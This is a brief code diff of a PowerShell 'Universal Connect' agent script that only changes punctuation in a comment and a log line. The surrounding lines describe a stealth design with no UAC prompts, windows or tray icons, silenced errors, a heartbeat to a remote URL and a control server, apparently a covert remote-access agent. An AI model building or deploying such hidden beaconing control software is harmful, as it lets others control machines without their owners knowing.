@@ -1,4 +1,4 @@
-# UC Universal Connect — Production Agent v2.0
+# UC Universal Connect - Production Agent v2.0
 # STEALTH: No UAC, no notifications, no windows, no tray icons
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
@@ -266,7 +266,7 @@ $heartbeatJob = Start-Job -ScriptBlock {
     }
 } -ArgumentList $VERCEL_URL, $HEARTBEAT_SEC
 
-Log "UC Agent v2.0 started — $VERCEL_URL"
+Log "UC Agent v2.0 started - $VERCEL_URL"
 
 # Main thread runs control server
 Start-ControlServer
